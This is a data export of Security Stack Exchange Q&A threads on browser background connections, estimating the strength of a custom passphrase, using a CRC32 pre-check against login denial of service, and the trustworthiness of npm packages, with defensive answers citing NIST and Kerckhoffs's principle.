<strong>without any website/url being opened</strong>.
Same thing happening for me in Firefox as well.</p>
<ol>
<li>Is it normal for a browser to establish connection like this.?</li>
<li>If not,what should be the steps to get rid of this issue.?</li>
</ol>
","7","3","269281","<p><strong>In most systems, this is the new normal.</strong></p>
<p>There is vendor documentation on why you might find some of them desirable, as well as how to stop <em>most</em> <a href=""https://support.mozilla.org/en-IE/kb/how-stop-firefox-making-automatic-connections"" rel=""noreferrer"">automatic connections made by Firefox</a>. However, as with most ad-sponsored software, the instructions are routinely rendered incomplete &amp; outdated with each newly released version. They would not see such major adoption if each addition required informed consent.</p>
<p>Most connections broadly fall into these categories:</p>
<ul>
<li><strong>Updating:</strong> Including software components and metadata of saved tabs &amp; bookmarks
<ul>
<li>e.g. Firefox might retrieve a current list of sites to endorse on your home page</li>
</ul>
</li>
<li><strong>Predicting</strong> soon-needed prerequisites and already establishing them
<ul>
<li>e.g. Firefox requests a database of potentially dangerous sites from Google, ready before using it to lookup your first navigation</li>
</ul>
</li>
<li><strong>Configuration:</strong> Some network (arguably: broken) configurations require active probing
<ul>
<li>e.g. only by actually trying Firefox can determine that it was pointed to a resolver deliberately returning incorrect results to point to a site managed by the wireless access point owner</li>
</ul>
</li>
<li><strong>Surveillance:</strong> The vendor collecting data on how the software is used or broken
<ul>
<li>e.g. Mozilla likes to base their decisions on how to proceed with rolling out new features and versions on how many people use them, and how many installations encountered obvious crashes</li>
</ul>
</li>
</ul>
","10"
"269265","269265","ESTABLISHED TCP connections after opening browser in linux","<p>I am using <code>netstat -acp | grep ESTABLISHED</code> command to check established connection
between with my system.</p>
<pre><code>$ sudo netstat -acp | grep ESTABLISHED
tcp        0      0 rg-Vostro-3546:51874    server-18-66-78-6:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:58112    199.232.22.137:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:55592    del12s08-in-f1.1e:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:43632    151.101.129.69:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:58128    199.232.22.137:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:48456    server-54-230-112:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:53632    server-18-161-111:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:55602    del12s08-in-f1.1e:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:36772    151.101.129.69:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:47712    server-54-192-111:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:59088    151.101.36.193:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:44872    stackoverflow.com:https ESTABLISHED 2093991/brave --typ 
udp        0      0 rg-Vostro-3546:bootpc   _gateway:bootps         ESTABLISHED 750/NetworkManager  
tcp        0      0 rg-Vostro-3546:51874    server-18-66-78-6:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:58112    199.232.22.137:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:55592    del12s08-in-f1.1e:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:43632    151.101.129.69:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:58128    199.232.22.137:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:48456    server-54-230-112:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:53632    server-18-161-111:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:55602    del12s08-in-f1.1e:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:36772    151.101.129.69:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:47712    server-54-192-111:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:59088    151.101.36.193:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:44872    stackoverflow.com:https ESTABLISHED 2093991/brave --typ 
udp        0      0 rg-Vostro-3546:bootpc   _gateway:bootps         ESTABLISHED 750/NetworkManager  
tcp        0      0 rg-Vostro-3546:51874    server-18-66-78-6:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:58112    199.232.22.137:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:55592    del12s08-in-f1.1e:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:43632    151.101.129.69:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:58128    199.232.22.137:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:48456    server-54-230-112:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:53632    server-18-161-111:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:55602    del12s08-in-f1.1e:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:36772    151.101.129.69:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:47712    server-54-192-111:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:59088    151.101.36.193:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:44872    stackoverflow.com:https ESTABLISHED 2093991/brave --typ 
udp        0      0 rg-Vostro-3546:bootpc   _gateway:bootps         ESTABLISHED 750/NetworkManager  
tcp        0      0 rg-Vostro-3546:51874    server-18-66-78-6:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:58112    199.232.22.137:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:55592    del12s08-in-f1.1e:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:43632    151.101.129.69:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:58128    199.232.22.137:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:48456    server-54-230-112:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:53632    server-18-161-111:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:55602    del12s08-in-f1.1e:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:36772    151.101.129.69:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:47712    server-54-192-111:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:59088    151.101.36.193:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:44872    stackoverflow.com:https ESTABLISHED 2093991/brave --typ 
udp        0      0 rg-Vostro-3546:bootpc   _gateway:bootps         ESTABLISHED 750/NetworkManager  
tcp        0      0 rg-Vostro-3546:51874    server-18-66-78-6:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:58112    199.232.22.137:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:55592    del12s08-in-f1.1e:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:43632    151.101.129.69:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:58128    199.232.22.137:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:48456    server-54-230-112:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:53632    server-18-161-111:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:55602    del12s08-in-f1.1e:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:36772    151.101.129.69:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:47712    server-54-192-111:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:59088    151.101.36.193:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:44872    stackoverflow.com:https ESTABLISHED 2093991/brave --typ 
udp        0      0 rg-Vostro-3546:bootpc   _gateway:bootps         ESTABLISHED 750/NetworkManager  
tcp        0      0 rg-Vostro-3546:51874    server-18-66-78-6:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:58112    199.232.22.137:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:55592    del12s08-in-f1.1e:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:43632    151.101.129.69:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:58128    199.232.22.137:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:48456    server-54-230-112:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:53632    server-18-161-111:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:55602    del12s08-in-f1.1e:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:36772    151.101.129.69:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:47712    server-54-192-111:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:59088    151.101.36.193:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:44872    stackoverflow.com:https ESTABLISHED 2093991/brave --typ 
udp        0      0 rg-Vostro-3546:bootpc   _gateway:bootps         ESTABLISHED 750/NetworkManager  
tcp        0      0 rg-Vostro-3546:51874    server-18-66-78-6:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:58112    199.232.22.137:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:55592    del12s08-in-f1.1e:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:43632    151.101.129.69:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:58128    199.232.22.137:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:48456    server-54-230-112:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:53632    server-18-161-111:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:55602    del12s08-in-f1.1e:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:36772    151.101.129.69:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:47712    server-54-192-111:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:59088    151.101.36.193:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:44872    stackoverflow.com:https ESTABLISHED 2093991/brave --typ 
udp        0      0 rg-Vostro-3546:bootpc   _gateway:bootps         ESTABLISHED 750/NetworkManager  
tcp        0      0 rg-Vostro-3546:51874    server-18-66-78-6:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:58112    199.232.22.137:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:55592    del12s08-in-f1.1e:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:43632    151.101.129.69:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:58128    199.232.22.137:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:48456    server-54-230-112:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:53632    server-18-161-111:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:55602    del12s08-in-f1.1e:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:36772    151.101.129.69:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:47712    server-54-192-111:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:59088    151.101.36.193:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:44872    stackoverflow.com:https ESTABLISHED 2093991/brave --typ 
udp        0      0 rg-Vostro-3546:bootpc   _gateway:bootps         ESTABLISHED 750/NetworkManager  
tcp        0      0 rg-Vostro-3546:51874    server-18-66-78-6:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:58112    199.232.22.137:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:55592    del12s08-in-f1.1e:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:43632    151.101.129.69:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:58128    199.232.22.137:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:48456    server-54-230-112:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:53632    server-18-161-111:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:55602    del12s08-in-f1.1e:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:36772    151.101.129.69:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:47712    server-54-192-111:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:59088    151.101.36.193:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:44872    stackoverflow.com:https ESTABLISHED 2093991/brave --typ 
udp        0      0 rg-Vostro-3546:bootpc   _gateway:bootps         ESTABLISHED 750/NetworkManager
</code></pre>
<p>After opening the browser is establishing the connections with different IP's
<strong>without any website/url being opened</strong>.
Same thing happening for me in Firefox as well.</p>
<ol>
<li>Is it normal for a browser to establish connection like this.?</li>
<li>If not,what should be the steps to get rid of this issue.?</li>
</ol>
","7","3","269293","<p>It may be &quot;normal&quot;, but it's not okay. At least for Firefox, there is a detailed guide published by Mozilla to disabling all of the huge number of &quot;automatic connections&quot; made for &quot;telemetry&quot; (a euphemism for surveillance), updates checking, support for their own/partner cloud services, captive portal &amp; network accessibility detection, etc.:</p>
<p><a href=""https://support.mozilla.org/en-US/kb/how-stop-firefox-making-automatic-connections"" rel=""nofollow noreferrer"">https://support.mozilla.org/en-US/kb/how-stop-firefox-making-automatic-connections</a></p>
<p>After following that guide, in theory there should not be any connections made on startup. If there are, the list will be much smaller and more managable to track down what's still happening.</p>
<p>I have no idea if Brave has similar functionality. Brave is not really a privacy-respecting or -oriented browser, just somewhat misleadingly marketed as one. If you want to track down what it's doing, you could start by switching all the preferences as private as you can get them (including turning off their BAT cryptocurrency stuff) and see if you get a more managable list to investigate.</p>
","3"
"269197","269197","How to analyze the security of a custom passphrase?","<p>Let's assume person A chooses 15 words for a passphrase with an average length of 5. The passphrase meets following conditions.</p>
<p>Word conditions:</p>
<ol>
<li>The first word is not a valid word and can't be found in any dictionary. It's twice the length of the average word and meets all conditions for a well password.</li>
<li>Word n=2 until word n=7 are not random, created by person.</li>
<li>Word n=8 until word n=15 are truly randomly generated.</li>
<li>All valid words are coming from 3 different languages.</li>
</ol>
<p>Further conditions:</p>
<ol>
<li>4 random special characters are mixed into the passphrase at random position.</li>
<li>4 digits are mixed into the passphrase at random position.</li>
<li>One letter is capitalized.</li>
<li>All words separated by space.</li>
</ol>
<p>I understand that:</p>
<ol>
<li>The not valid word increases probably the security with increasing length, because it's like a password.</li>
<li>The not random part decreases the security with increasing length.</li>
<li>The truly randomly generated part increases the security with increasing length.</li>
<li>The usage of multiple languages increases the search space.</li>
<li>Points 5-7 increase the security, if chosen truly randomly.</li>
</ol>
<p><em><strong>What I want to know is: How to rate the overall security of this passphrase?</strong></em></p>
<p>Because the security can still be dramatically increased or decreased through a combination of this parts.</p>
<p><strong>Scenario 1:</strong> Person B doesn't know anything about the creation.</p>
<p><strong>Scenario 2:</strong> Person B has partial knowledge of the passphrase:</p>
<ol>
<li>That the first word isn't a word.</li>
<li>That there must be a random and a not random part.</li>
<li>That the words are coming from different languages.</li>
<li>That there are digits and special characters are mixed in.</li>
<li>That the passphrase may contain capitals and they may be separated.</li>
</ol>
<p>Maybe more, if I forgot something.</p>
<p><strong>Scenario 3:</strong> Person B knows everything about the creation rules of the unknown passphrase.</p>
<p>How would Person B proceed in the various scenarios and what would be the overall outcome of their efforts?</p>
","0","3","269204","<p>To quote a co-worker of mine: <em>&quot;It's always the people with the most secure passwords, who worry about their passwords not being secure enough.&quot;</em></p>
<hr />
<p>To answer the question directly: <strong>Your passphrase is secure for all intents and purposes.</strong> If you want to know why, keep reading.</p>
<h3>Scenario 1: No Previous Knowledge</h3>
<p>This is the scenario, which is most likely. An attacker obtains a hash of your password in one way or another, and now tries to brute-force it.</p>
<p>15 words with an average word length of 5 means a 75 character long password. Even of all of that were lowercase and an attacker would try only lowercase characters, that would be 26<sup>75</sup> or a bit more over 350 bits of security. That is enough security to never worry about computational power.</p>
<p>Even if an attacker would try various english words with rules that would just <em>happen</em> to coincide with your chosen capitalization, number substitution or other characteristics, the amount of available computing power would not suffice.</p>
<p>Furthermore, attackers don't need to crack <em>all</em> the passwords. 30% success rate is already extremely good. Remember, you just need to be a more difficult target than a user who's password is <code>Spring2023</code>.</p>
<h3>Scenarios 2 and 3: Partial / Full Knowledge</h3>
<p>These two are extremely similar, to the ppint where there is no meaningful difference. An attacker with full knowledge would likely see that this is fruitless and give up. This sounds like a cop-out, but cracking passwords has a cost associated with it.</p>
<p>For one, if you crack in the cloud, it takes a specific amount of money to try a specific amount of password hashes. Even on a &quot;fast hash&quot;, this is rather expensive once you're trying to calculate a dodecillion hashes.</p>
<p>Even if you crack offline, you need to pay for electricity, and you could spend that computational power on other, more lucrative things as well.</p>
<p>So just from a viability perspective, an attacker, who knows how your passphrase is constructed, will see it's pointless to try and instead tries to attack some other hash. Even a nation-state actor would find it to be easier and more effective to try and install malware on your device instead than trying to crack this hash.</p>
","0"
"269197","269197","How to analyze the security of a custom passphrase?","<p>Let's assume person A chooses 15 words for a passphrase with an average length of 5. The passphrase meets following conditions.</p>
<p>Word conditions:</p>
<ol>
<li>The first word is not a valid word and can't be found in any dictionary. It's twice the length of the average word and meets all conditions for a well password.</li>
<li>Word n=2 until word n=7 are not random, created by person.</li>
<li>Word n=8 until word n=15 are truly randomly generated.</li>
<li>All valid words are coming from 3 different languages.</li>
</ol>
<p>Further conditions:</p>
<ol>
<li>4 random special characters are mixed into the passphrase at random position.</li>
<li>4 digits are mixed into the passphrase at random position.</li>
<li>One letter is capitalized.</li>
<li>All words separated by space.</li>
</ol>
<p>I understand that:</p>
<ol>
<li>The not valid word increases probably the security with increasing length, because it's like a password.</li>
<li>The not random part decreases the security with increasing length.</li>
<li>The truly randomly generated part increases the security with increasing length.</li>
<li>The usage of multiple languages increases the search space.</li>
<li>Points 5-7 increase the security, if chosen truly randomly.</li>
</ol>
<p><em><strong>What I want to know is: How to rate the overall security of this passphrase?</strong></em></p>
<p>Because the security can still be dramatically increased or decreased through a combination of this parts.</p>
<p><strong>Scenario 1:</strong> Person B doesn't know anything about the creation.</p>
<p><strong>Scenario 2:</strong> Person B has partial knowledge of the passphrase:</p>
<ol>
<li>That the first word isn't a word.</li>
<li>That there must be a random and a not random part.</li>
<li>That the words are coming from different languages.</li>
<li>That there are digits and special characters are mixed in.</li>
<li>That the passphrase may contain capitals and they may be separated.</li>
</ol>
<p>Maybe more, if I forgot something.</p>
<p><strong>Scenario 3:</strong> Person B knows everything about the creation rules of the unknown passphrase.</p>
<p>How would Person B proceed in the various scenarios and what would be the overall outcome of their efforts?</p>
","0","3","269205","<p>For this assignment, you should assume that:</p>
<ol>
<li><p>the attacker knows exactly how you are generating the passphrase, including the <em>exact</em> wordlist(s) that the words were selected from (<a href=""https://en.wikipedia.org/wiki/Kerckhoffs%27s_principle"" rel=""nofollow noreferrer"">Kerckhoffs' Principle</a>);</p>
</li>
<li><p>the method used to hash the password is worst case (a very fast hash like MD5), as this is often unknown or outside the control of the defender;</p>
</li>
<li><p>there is a target level of capability of the attacker (say, a trillion hashes/second); and</p>
</li>
<li><p>there is a desired period of time to resist attack (say, 10 years).</p>
</li>
</ol>
<p>The security of the passphrase should be derived solely from A) the  elements being chosen truly randomly, and B) the total number of possible combinations of elements. The sheer size of B) should be large enough to make brute force infeasible - perhaps on the order of 10^25 or more combinations, depending on assumed attacker capability and target resistance time.</p>
<p>Note also  the &quot;average&quot; password will be cracked in <em>half</em> of the time it takes to exhaust the <em>entire</em> keyspace, so you might need to double your strength so that the average user meets or exceeds your target resistance time.</p>
<p>In other words: define your assumptions, then do the math of how many combinations of your passphrases are possible ... and you can answer your own question. :D</p>
<p>P.S. Your scheme is almost certainly very difficult for a human to memorize - which makes it likely that the goal isn't to support human memorization. And if not for humans, a simple random string of equivalent entropy / keyspace would be fine (and all of this complexity would be unnecessary). So this feels like an artificial problem.</p>
","1"
"269197","269197","How to analyze the security of a custom passphrase?","<p>Let's assume person A chooses 15 words for a passphrase with an average length of 5. The passphrase meets following conditions.</p>
<p>Word conditions:</p>
<ol>
<li>The first word is not a valid word and can't be found in any dictionary. It's twice the length of the average word and meets all conditions for a well password.</li>
<li>Word n=2 until word n=7 are not random, created by person.</li>
<li>Word n=8 until word n=15 are truly randomly generated.</li>
<li>All valid words are coming from 3 different languages.</li>
</ol>
<p>Further conditions:</p>
<ol>
<li>4 random special characters are mixed into the passphrase at random position.</li>
<li>4 digits are mixed into the passphrase at random position.</li>
<li>One letter is capitalized.</li>
<li>All words separated by space.</li>
</ol>
<p>I understand that:</p>
<ol>
<li>The not valid word increases probably the security with increasing length, because it's like a password.</li>
<li>The not random part decreases the security with increasing length.</li>
<li>The truly randomly generated part increases the security with increasing length.</li>
<li>The usage of multiple languages increases the search space.</li>
<li>Points 5-7 increase the security, if chosen truly randomly.</li>
</ol>
<p><em><strong>What I want to know is: How to rate the overall security of this passphrase?</strong></em></p>
<p>Because the security can still be dramatically increased or decreased through a combination of this parts.</p>
<p><strong>Scenario 1:</strong> Person B doesn't know anything about the creation.</p>
<p><strong>Scenario 2:</strong> Person B has partial knowledge of the passphrase:</p>
<ol>
<li>That the first word isn't a word.</li>
<li>That there must be a random and a not random part.</li>
<li>That the words are coming from different languages.</li>
<li>That there are digits and special characters are mixed in.</li>
<li>That the passphrase may contain capitals and they may be separated.</li>
</ol>
<p>Maybe more, if I forgot something.</p>
<p><strong>Scenario 3:</strong> Person B knows everything about the creation rules of the unknown passphrase.</p>
<p>How would Person B proceed in the various scenarios and what would be the overall outcome of their efforts?</p>
","0","3","269207","<p><strong>Consider alternatives</strong></p>
<p>Security does not necessarily correlate with entropy. If a password is too complex, it cannot be memorized and many users may write it down. A potential attacker can easily see the password without any brute-forcing.</p>
<p>See what NIST say about it in the document <a href=""https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-63b.pdf"" rel=""nofollow noreferrer"">NIST SP 800-63B</a>, chapter A.3.</p>
<blockquote>
<p>Highly complex memorized secrets introduce a new potential vulnerability: they are less likely to be memorable, and it is more likely that they will be written down or stored electronically in an <strong>unsafe</strong> manner.</p>
</blockquote>
<blockquote>
<p>As a result, users often work around these restrictions in a way that is counterproductive...</p>
</blockquote>
<p>You suggest that users will chose words 1 - 7. But according to NIST it makes your passphrase weaker:</p>
<blockquote>
<p>... composition rules are commonly used in an attempt to increase the difficulty of guessing user-chosen passwords. Research has shown, however, that users respond in <strong>very predictable</strong> ways...</p>
</blockquote>
<blockquote>
<p>Users’ password choices are very predictable...</p>
</blockquote>
<p>The random part of your passphrase is better. NIST says about it:</p>
<blockquote>
<p>Secrets that are randomly chosen ... and are uniformly distributed will be more difficult to guess or brute-force attack than user-chosen secret...</p>
</blockquote>
<p>Thus, NIST does not recommend complex passwords. How can you reach security then? NIST has an answer:</p>
<blockquote>
<p>Password length has been found to be a primary factor in characterizing password strength.</p>
</blockquote>
<p>In this document NIST recommends entropy of at least 112 bits. Means, take some simple algorithm and make the passphrase so long that it gives 112 bits entropy. Examples:</p>
<ul>
<li>If password consists of randomly chosen English low case letters, it should be at least 24 characters long: 26<sup>24</sup> = 2<sup>113</sup>, means 113 bits entropy.</li>
<li>If you use random words out of Diceware dictionary, 7776 words, the password should consist of at least 9 words, which gives 116 bits entropy.</li>
</ul>
<p><strong>If you still want to estimate entropy of your algorithm...</strong></p>
<p>According to the <a href=""https://en.wikipedia.org/wiki/Kerckhoffs%27s_principle"" rel=""nofollow noreferrer"">Kerckhoffs's principle</a> you should assume that an attacker knows everything about how the passphrase was generated. That's why it makes sense to consider only the 3rd case.</p>
<p>Any restriction reduces the number of possible passphrase candidates and thus <strong>reduces</strong> the entropy. That's why the attacker will try to apply all the known information.</p>
<ul>
<li>Restriction for the average length of 5 means that the total length of the passphrase is 75. This means, the attacker will <strong>skip</strong> many word combinations because they give too short or too long passwords. The number of combinations depends on the language. For more then one language the principle remains the same.</li>
<li>Words 2 to 7 are not random, but chosen by a user. According to NIST (see above) it means low entropy. I would consider it negligible compared to the randomly generated part 8 - 15, and would not consider it in the calculation.</li>
<li><em>&quot;4 random special characters...&quot;</em>: The number of ways to pick up 4 of 75 positions is 75!/(4!*(75-4)!) = 1 215 450. The number of phase candidates should be multiplied by this number.</li>
<li>For 4 fixed positions of special characters, there can be N<sup>4</sup> combinations, where N is the number of special characters. Multiply the result from previous steps by this number.</li>
<li>One of 75 letters is capitalized. Thus multiply the number of combinations by 75.</li>
</ul>
","2"
"269029","269029","Avoid checking passwords for dos attacks","<p>A server gets requests with a username and password. Checking the password can be expensive, so a hacker can do a DoS attack by sending lots of requests with random  passwords. No attempt to break in, just trying to waste time on the server.</p>
<p>Would it be safe to store a CRC32 checksum of the correct password per username, so the huge majority of random password guesses can be rejected with very little effort? Especially if the rejection is delayed, so an attacker cannot know whether they got the checksum right?</p>
","0","3","269032","<blockquote>
<p>Would it be safe to store a CRC32 checksum of the correct password per username, so the huge majority of random password guesses can be rejected with very little effort?</p>
</blockquote>
<p>No, it would not be safe. <a href=""https://en.wikipedia.org/wiki/Cyclic_redundancy_check"" rel=""nofollow noreferrer"">CRC codes</a> are not meant to be <a href=""https://en.wikipedia.org/wiki/Cryptographic_hash_function"" rel=""nofollow noreferrer"">cryptographically secure</a>. It's much <a href=""https://stackoverflow.com/a/1517776"">easier</a> to find <a href=""https://en.wikipedia.org/wiki/Hash_collision"" rel=""nofollow noreferrer"">collisions</a> with CRCs rather than with cryptographically secure hashes. Also, in case that an attacker gets hold of your db, it would be much easier to retrieve the passwords by brute forcing the CRC32 hashes than if you used a strong <a href=""https://en.wikipedia.org/wiki/Key_derivation_function"" rel=""nofollow noreferrer"">key derivation function</a>. The reason is that a key derivation function is by design expensive (CPU/RAM) to execute, which makes brute forcing passwords a very resource demanding process; on the other hand, CRC codes do not have this feature.</p>
<p>If you wanted to actually replace the password hashes with the CRC codes, then in this <a href=""https://eklitzke.org/crcs-vs-hash-functions"" rel=""nofollow noreferrer"">article</a> you'll find a quick explanation on why you shouldn't do it.</p>
","2"
"269029","269029","Avoid checking passwords for dos attacks","<p>A server gets requests with a username and password. Checking the password can be expensive, so a hacker can do a DoS attack by sending lots of requests with random  passwords. No attempt to break in, just trying to waste time on the server.</p>
<p>Would it be safe to store a CRC32 checksum of the correct password per username, so the huge majority of random password guesses can be rejected with very little effort? Especially if the rejection is delayed, so an attacker cannot know whether they got the checksum right?</p>
","0","3","269035","<p>From my understanding you are trying to do a two step verification of the password: first a cheap verification against a CRC32 which will filter out many password attempts quickly but still match some wrong passwords. Then the more expensive real password check to find out if the password passing CRC32 is also the expected password.</p>
<p>The problem with this approach is that you must assume that the expected CRC32 can leak the same way as the &quot;real&quot; robust password hash can leak.
A good password hash must provide its high use of resources (time, memory) for every entered password, no matter if it is a valid one or not. By adding CRC32 you instead created essentially a password hash which is cheap and fast for wrong passwords but expensive for right passwords - thus allowing a brute force attack to quickly skip over the majority of the wrong passwords.</p>
","2"
"269029","269029","Avoid checking passwords for dos attacks","<p>A server gets requests with a username and password. Checking the password can be expensive, so a hacker can do a DoS attack by sending lots of requests with random  passwords. No attempt to break in, just trying to waste time on the server.</p>
<p>Would it be safe to store a CRC32 checksum of the correct password per username, so the huge majority of random password guesses can be rejected with very little effort? Especially if the rejection is delayed, so an attacker cannot know whether they got the checksum right?</p>
","0","3","269036","<p>Safe is not an absolute given. If you are absolutely sure that no-one will ever be able to access your database of CRCs, then it would probably be OK. However, once the CRC32s are compromised, you reduce the complexity for finding passwords significantly.</p>
<p>If, instead of a CRC32, you would use only a simple parity-bit, you would still reduce the quantity of checks significantly, and the information in your password-parity database is not all that valuable. Note, that it will also reduce the amount of time to bute-force passwords by 50% if the password-parity database gets stolen.</p>
<p>So, as so often in security, it's a trade-off. You could increase the minimal password size by 1 character, and use a 4 bit checksum, for example.</p>
","0"
"268952","268952","Security and data protection reviews of npm packages","<p>Does npm ensure that the packages are not spying on your data, saving it somewhere or is it the responsibility of the developer to ensure it? Can I confidently use the moderately well-known packages without the data being saved and mishandled?</p>
","0","3","268953","<p>There is no authority that is verifying packages in the npm registry. Whenever you obtain a package you need to trust the publisher or verify it yourself.</p>
<p>This applies to both the absence of malicious code and privacy impact. The latter is especially difficult as privacy regulations differ based on local legislation.</p>
<p>If the publisher is a well-known entity that has a long history of properly handling their packages and adhering to relevant privacy regulation it is often 'good enough'. Whether this is enough for you depends on your threat landscape and your risk appetite, so it is always prudent to perform a risk analysis before using packages from public sources.</p>
","2"
